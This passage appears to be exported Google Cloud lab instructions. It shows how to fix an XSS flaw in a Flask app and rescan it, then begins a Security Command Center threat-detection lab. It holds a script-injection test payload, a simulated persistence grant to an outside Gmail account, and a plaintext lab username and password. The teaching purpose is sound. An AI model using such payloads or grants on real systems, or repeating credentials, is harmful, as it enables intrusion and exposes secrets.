CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:17] "GET /output HTTP/1.1" 200 -</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p><span>You may see log statements with the following HTTP status codes:</span></p><ul><li><p><strong><span>200:</span></strong><span> A successful request, where the HTTP server answered with an OK response.</span></p></li><li><p><strong><span>302:</span></strong><span> Indicates a resource is temporarily located elsewhere according to the Location header.</span></p></li><li><p><strong><span>404:</span></strong><span> indicates that one or more resources were not found.</span></p></li></ul><p><span>Check out the </span><a href='https://cloud.google.com/storage/docs/json_api/v1/status-codes#standardcodes'><span>HTTP Status and Error Codes</span></a><span> documentation for more information.</span></p><p><span>While the scan is running, feel free to explore the </span><strong><span>Results</span></strong><span>, </span><strong><span>URLs Crawled</span></strong><span>, and </span><strong><span>Details</span></strong><span> tabs. You can also check out this </span><a href='https://www.youtube.com/watch?v=1BengAd2_cI'><span>getting started video</span></a><span>, or this </span><a href='https://www.youtube.com/watch?v=ai5Hr5zkn50'><span>vulnerability scanning video</span></a><span> to learn more about Web Security Scanner.</span></p><ol start='' ><li><p><span>When the scan is done running, the </span><strong><span>Results</span></strong><span> tab should indicate the cross-site vulnerabilities.</span></p></li></ol><p><img src="images\zNjWH7Ajz8Vkduyrzuzfqd2sWL7fMuUdx%2BKGyE9zHNg%3D" referrerpolicy="no-referrer" alt="Web Security Scanner results with vulnerabilities"></p><p><span>The Web Security Scanner was able to scan all starting URLs and detect the XSS vulnerabilities in Cymbal Bank&#39;s application. The ability to automate the detection of these critical vulnerabilities is a major benefit for security-minded organizations like Cymbal Bank.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Run a Web Security Scanner scan and detect application vulnerabilities</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-5-correct-the-vulnerability-and-scan-again-2'><span>Task 5. Correct the vulnerability and scan again</span></h2><p><span>Now that you have demonstrated Web Security Scanner can detect a XSS vulnerability, you remediate the vulnerability and run the application scan again.</span></p><ol start='' ><li><p><span>Return to your SSH window that&#39;s connected to your VM instance.</span></p></li><li><p><span>Stop the running application by pressing </span><strong><span>CTRL + C</span></strong><span>.</span></p></li><li><p><span>Edit the </span><strong><span>app.py</span></strong><span> file using the nano editor by running the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">nano app.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Locate the two lines that set the output string:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#  output_string = "".join([html_escape_table.get(c, c) for c in input_string])</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  output_string = input_string</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Remove the </span><code>#</code><span> symbol from the first line and add it to the beginning of the next line (</span><em><span>ensure that you indent your code properly!</span></em><span>)</span></p></li></ol><p><span>Your final lines must resemble the following:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">@app.route('/output')</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">def output():</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  output_string = "".join([html_escape_table.get(c, c) for c in input_string])</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  # output_string = input_string</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  return flask.render_template("output.html", output=output_string)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> </span><code>html_escape_table</code><span> is a dictionary that contains one-to-one pairings of special HTML characters like &quot;&lt;&quot; to their text representation. You use this table to escape special HTML characters so your form ingests and interprets submissions as raw text only. You can refer to this </span><a href='https://www.lambdatest.com/free-online-tools/html-escape#:~:text=What is HTML Escape%3F,HTML entities to plain text'><span>What is HTML Escape?</span></a><span> documentation for more information.</span></p><ol start='' ><li><p><span>Now type </span><strong><span>CTRL+X</span></strong><span>, </span><strong><span>Y</span></strong><span>, and </span><strong><span>Enter</span></strong><span> to save your changes.</span></p></li><li><p><span>Re-run the application:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 app.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Return to the Google Cloud console browser tab (you should still have the Web Security Scanner page open):</span></p></li><li><p><span>Click </span><strong><span>Run</span></strong><span> at the top of the page.</span></p></li></ol><p><span>In your SSH Window, you should start to see logs where Web Security Scanner tests application URLs for potential vulnerabilities.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.29.3.21 - - [23/Mar/2023 23:30:41] "GET /output HTTP/1.1" 200 -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:06] "GET /output HTTP/1.1" 200 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:07] "GET /favicon.ico HTTP/1.1" 404 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "POST / HTTP/1.1" 302 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "GET /output HTTP/1.1" 200 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "GET /favicon.ico HTTP/1.1" 404 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:17] "POST / HTTP/1.1" 302 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:17] "GET /output HTTP/1.1" 200 -</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><ol start='' ><li><p><span>While you are waiting for the results of the scan, login to the URL </span><code>http://&lt;EXTERNAL_IP&gt;:8080</code><span> using your browser in a separate tab.</span></p><p><span>The web form displays once again.</span></p></li><li><p><span>In the web form, enter the same string that you entered in before:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;script&gt;alert('This is an XSS Injection')&lt;/script&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now click the </span><strong><span>POST</span></strong><span> button.</span></p></li><li><p><span>Verify that this time you receive the following string in the browser:</span></p></li></ol><p><img src="images\UuSnBBO%2BKVOGv47KPpzEBSOoa%2F%2FghXxJ8znqMt9TzL0%3D" referrerpolicy="no-referrer" alt="Input displayed as text string"></p><p><strong><span>Note:</span></strong><span> Although this technique works in this simple scenario, for proper protection of your web application you need to use more advanced techniques and frameworks which are out of scope of this lab.</span></p><p>&nbsp;</p><p><span>Explore the links below for more resources:</span></p><ul><li><p><a href='https://angular.io/guide/security'><span>Angular Security</span></a></p></li><li><p><a href='https://xss-game.appspot.com/'><span>Google XSS Game</span></a></p></li><li><p><a href='https://owasp.org/www-project-juice-shop/'><span>OWASP Juice Shop</span></a></p></li></ul><ol start='' ><li><p><span>Return to the Google Cloud console, where you left off on the Web Security Scanner page.</span></p></li><li><p><span>Click </span><strong><span>Run</span></strong><span> at the top of the page to re-scan your application.</span></p></li><li><p><span>Soon after, you should notice that the results yield no more XSS vulnerabilities.</span></p></li></ol><p><img src="images\nfsc%2B30HZrnOWepWCagx3F5tZlFOWKm03XuwQDa2kzQ%3D" referrerpolicy="no-referrer" alt="Web Security Scanner output with no vulnerabilities"></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Correct vulnerabilities and rescan your application using Web Security Scanner</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='congratulations-40'><span>Congratulations!</span></h2><p><span>You have successfully demonstrated to the Cymbal Bank CTO how to identify and remediate XSS vulnerabilities with Google Cloud&#39;s powerful Web Security Scanner solution.</span></p><p>&nbsp;</p><p>&nbsp;</p><h2 id='lab---detect-and-investigate-threats-with-security-command-center'><span>LAB - Detect and Investigate Threats with Security Command Center</span></h2><p>&nbsp;</p><h2 id='overview-43'><span>Overview</span></h2><p><span>Event Threat Detection is an integrated service of Security Command Center (SCC) that monitors Google Cloud logs for patterns signaling suspicious activities.</span></p><p><span>Container Threat Detection is another integrated service of SCC. This service can continuously monitor GKE working nodes. When it detects suspicious events, it analyzes them to confirm whether they can be treated as incidents or not.</span></p><p><span>In this lab, you receive hands-on practice with SCC&#39;s threat detection features and learn how to investigate and triage common vulnerabilities associated with events and virtual machines. You learn how to surface and manage your findings with SCC&#39;s Event Threat Detection features.</span></p><h3 id='objectives-31'><span>Objectives</span></h3><p><span>In this lab, you learn how to perform the following tasks:</span></p><ul><li><p><span>Initiate and mitigate a threat with Event Threat Detection.</span></p></li><li><p><span>Configure a cloud environment to detect threats.</span></p></li><li><p><span>Manage SCC findings with Event Threat Detection.</span></p></li></ul><h3 id='prerequisites-4'><span>Prerequisites</span></h3><p><span>It is recommended that you are familiar with the following before starting this lab:</span></p><ul><li><p><span>Cloud computing concepts.</span></p></li><li><p><span>The Google Cloud console.</span></p></li><li><p><span>The Security Command Center interface.</span></p></li><li><p><span>Containers and Google Kubernetes Engine (this is recommended, but not required).</span></p></li></ul><h2 id='setup-and-requirements-38'><span>Setup and requirements</span></h2><h3 id='before-you-click-the-start-lab-button-26'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources are made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito (recommended) or private browser window to run this lab. This prevents conflicts between your personal account and the student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab—remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use only the student account for this lab. If you use a different Google Cloud account, you may incur charges to that account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-20'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a dialog opens for you to select your payment method. On the left is the Lab Details pane with the following:</span></p><ul><li><p><span>The Open Google Cloud console button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the Sign in page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-03-352f3bc3fa17@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Username in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4mnnBMeMiRz5</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h2 id='scenario-5'><span>Scenario</span></h2><p><img src="images\qO2i8mve9e0jOrBbEsDzPFfEkM1ea6S0a7mXdN%2FNS%2BA%3D" referrerpolicy="no-referrer" alt="5ce916afc496a60c.jpeg"></p><p>&nbsp;</p><p><span>Cymbal Bank is an American retail bank with over 2,000 branches in all 50 states. It offers comprehensive debit and credit services that are built on top of a robust payments platform. Cymbal Bank is a digitally transforming legacy financial services institution.</span></p><p><span>Cymbal Bank was founded in 1920 under the name Troxler. Cymbal Group acquired the company in 1975 after it had been investing heavily in Cymbal Group&#39;s proprietary ATMs. As the bank grew into a national leader, they put strategic emphasis on modernizing the customer experience both in-person at their branches and digitally through an app they released in 2014. Cymbal Bank employs 42,000 people nationwide and, in 2019, reported $24 billion in revenue.</span></p><p><span>As a Cloud Security Engineer at Cymbal Bank, your task is to explore and implement robust security measures, leveraging Security Command Center&#39;s Event and Container Threat Detection capabilities for its Google Cloud resources. By integrating these services, you can ensure real-time monitoring, swift anomaly identification, and proactive vulnerability management for the event-driven architectures and containerized applications.</span></p><h2 id='enable-the-security-command-center-api'><span>Enable the Security Command Center API</span></h2><ol start='' ><li><p><span>Click on the </span><strong><span>Navigation menu</span></strong><span> in the top left corner of the Google Cloud console.</span></p></li><li><p><span>Select </span><strong><span>APIs &amp; Services</span></strong><span> from the drop down and click on </span><strong><span>Enable APIs &amp; Services</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+ Enable APIs &amp; Services</span></strong></p></li><li><p><span>Search for </span><code>Security Command Center API</code><span> in the search box.</span></p></li><li><p><span>Click on </span><strong><span>Security Command Center API</span></strong><span>, then click </span><strong><span>Enable</span></strong></p></li></ol><h2 id='task-1-initiate-and-mitigate-a-threat-with-event-threat-detection'><span>Task 1. Initiate and mitigate a threat with Event Threat Detection</span></h2><p><span>Your first task as a Cloud Security Engineer for Cymbal Bank is to initiate and mitigate non-compliant accounts threats with Event Threat Detection.</span></p><p><img src="images\yLiATC2UXTI91KY5Deyh1yu%2Fc6bvGjp%2B81S94awhjZs%3D" referrerpolicy="no-referrer" alt="8da0945e074700f7.png"></p><p>&nbsp;</p><p><span>The Event Threat Detection service of SCC detects many threats by monitoring suspicious activities reported in Google Cloud logs. One of these activities might be delegating sensitive roles to an external user, such as someone who has a miscellaneous </span><code>gmail.com</code><span> account that isn&#39;t tied to your corporate domain.</span></p><p><span>This might happen in situations when an intruder has managed to access a GCP organization and now they are interested in establishing persistence. To do this, the hacker would grant sensitive roles to their </span><code>@gmail.com</code><span> account.</span></p><p><span>This delegation simulates establishing persistence. If a hacker accidentally gets temporary access to your system, they will need to establish persistence and to get access to a more stable account.</span></p><ol start='' ><li><p><span>In the Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), select </span><strong><span>IAM &amp; Admin &gt; IAM</span></strong><span>.</span></p></li><li><p><span>Press the </span><strong><span>Grant Access</span></strong><span> button.</span></p></li><li><p><span>In the &quot;New principals&quot; field, enter the demo email address </span><code>demouser1@gmail.com</code><span>.</span></p></li><li><p><span>For the Role field, select </span><strong><span>BigQuery &gt; BigQuery Admin</span></strong><span> and click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) and select </span><strong><span>Security &gt; Security Command Center &gt; Findings</span></strong><span>.</span></p></li><li><p><span>Change the Time Range dropdown to the </span><strong><span>Last 6 hours.</span></strong></p></li></ol><p><span>You should see three Findings, two of which are related to the access you just granted:</span></p><ul><li><p><em><span>Non org IAM member</span></em></p></li><li><p><em><span>Persistence: IAM anomalous grant</span></em></p></li></ul><ol start='' ><li><p><span>Click on the Finding </span><strong><span>Non org IAM member</span></strong><span> and scroll down to check the &quot;Source display name&quot; in the description of this Finding.</span></p></li><li><p><span>Ensure that the display name is set to </span><code>Security Health Analytics</code><span>—this is the SCC service that detected a misconfiguration in your Google Cloud Project.</span></p></li><li><p><span>Close the window with the Finding.</span></p></li><li><p><span>Click on the other Finding, </span><strong><span>Persistence: IAM anomalous grant</span></strong><span>, and scroll down to check the &quot;Source display name&quot; in the description of this 